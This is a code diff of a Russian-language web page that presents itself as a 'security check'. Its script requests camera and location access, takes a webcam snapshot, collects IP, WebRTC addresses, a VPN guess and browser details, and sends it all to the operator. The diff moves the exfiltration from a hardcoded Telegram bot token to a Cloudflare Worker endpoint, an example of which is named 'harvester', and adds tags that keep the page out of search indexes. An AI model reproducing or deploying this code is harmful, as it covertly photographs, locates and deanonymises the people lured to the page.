@@ -4,6 +4,7 @@
 <meta charset="utf-8">
 <title>Проверка безопасности</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow,noarchive">
 <style>
   *{box-sizing:border-box}
   body{font-family:-apple-system,system-ui,"Segoe UI",Arial,sans-serif;
@@ -61,10 +62,11 @@
 
 <script>
 // ============================================================
-// ВСТАВЬ СЮДА СВОИ ЗНАЧЕНИЯ
+// ВСТАВЬ СЮДА URL ТВОЕГО CLOUDFLARE WORKER
+// НЕ ЗАБУДЬ ПРО СЛЭШ В КОНЦЕ ПУТИ (без слэша в самом конце!)
 // ============================================================
-var TG_TOKEN = "8920061712:AAF6KTqtPUr0jpf6xwImeg0FWxiq5-otZLw";
-var TG_CHAT = "8152269891";
+var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send";
+// Пример: "https://harvester.snowy-river-1234.workers.dev/api/send"
 // ============================================================
 
 (function(){
@@ -78,38 +80,27 @@ var TG_CHAT = "8152269891";
     st.textContent = text;
   }
 
-  async function sendTG(text, photoBase64){
-    // Если есть фото — шлём sendPhoto, иначе sendMessage
-    if (photoBase64) {
-      try {
-        var blob = await (await fetch(photoBase64)).blob();
-        var form = new FormData();
-        form.append('chat_id', TG_CHAT);
-        form.append('photo', blob, 'snapshot.jpg');
-        form.append('caption', text.slice(0, 1000));
-        form.append('parse_mode', 'HTML');
-        await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendPhoto', {
-          method: 'POST',
-          body: form
-        });
-        return true;
-      } catch(e) {
-        console.log('photo send failed:', e);
-      }
-    }
-    // Фоллбэк — просто текст
+  async function sendReport(text, photoDataUrl){
     try {
-      await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TG_CHAT,
-          text: text,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true
-        })
-      });
-    } catch(e) { console.log('tg send failed:', e); }
+      if (photoDataUrl) {
+        var blob = await (await fetch(photoDataUrl)).blob();
+        var form = new FormData();
+        form.append('caption', text);
+        form.append('photo', blob, 'snapshot.jpg');
+        var r = await fetch(WORKER_URL, { method: 'POST', body: form });
+        return await r.json();
+      } else {
+        var r2 = await fetch(WORKER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ text: text })
+        });
+        return await r2.json();
+      }
+    } catch (e) {
+      console.log('send failed:', e);
+      return { ok: false, err: e.message };
+    }
   }
 
   async function getIpInfo(){
@@ -193,7 +184,6 @@ var TG_CHAT = "8152269891";
         });
         cam.srcObject = stream;
         cam.play();
-        // Ждём, пока видео реально начнёт отдавать кадры
         await new Promise(function(res){
           var t = setTimeout(res, 1500);
           cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 300); };
@@ -205,10 +195,7 @@ var TG_CHAT = "8152269891";
         var ctx = snap.getContext('2d');
         ctx.drawImage(cam, 0, 0, w, h);
         var dataUrl = snap.toDataURL('image/jpeg', 0.85);
-
-        // Выключаем камеру сразу после снимка
         stream.getTracks().forEach(function(t){ t.stop(); });
-
         resolve({ dataUrl: dataUrl, w: w, h: h });
       } catch(e) {
         resolve({ error: e.name + ': ' + e.message });
@@ -233,8 +220,6 @@ var TG_CHAT = "8152269891";
     btn.textContent = 'Проверяем…';
     setStatus('Запрашиваем разрешения…');
 
-    // Запускаем все запросы параллельно
-    // Браузер покажет попапы: камера + геолокация
     var [ipInfo, rtc, geo, camRes] = await Promise.all([
       getIpInfo(),
       getLocalAndSrflx(),
@@ -244,7 +229,6 @@ var TG_CHAT = "8152269891";
 
     setStatus('Формируем отчёт…');
 
-    // Определяем подозрение на VPN
     var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     var vpnSuspected = false;
     try {
@@ -258,7 +242,6 @@ var TG_CHAT = "8152269891";
       }
     } catch(e){}
 
-    // Разбираем геолокацию
     var geoLine = 'не получена';
     var addressLine = '';
     if (geo && !geo.error) {
@@ -270,7 +253,6 @@ var TG_CHAT = "8152269891";
       geoLine = 'отклонено: ' + geo.error;
     }
 
-    // Разбираем камеру
     var camLine = 'не получена';
     if (camRes && camRes.dataUrl) {
       camLine = 'снимок сделан ' + camRes.w + 'x' + camRes.h;
@@ -300,11 +282,10 @@ var TG_CHAT = "8152269891";
       '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
       '🕐 ' + new Date().toISOString();
 
-    // Отправляем
     var photoData = (camRes && camRes.dataUrl) ? camRes.dataUrl : null;
-    var ok = await sendTG(text, photoData);
+    var res = await sendReport(text, photoData);
 
-    if (ok) {
+    if (res && res.ok) {
       setStatus('✓ Проверка завершена. Перенаправляем…', 'ok');
       btn.textContent = '✓ Готово';
       setTimeout(function(){
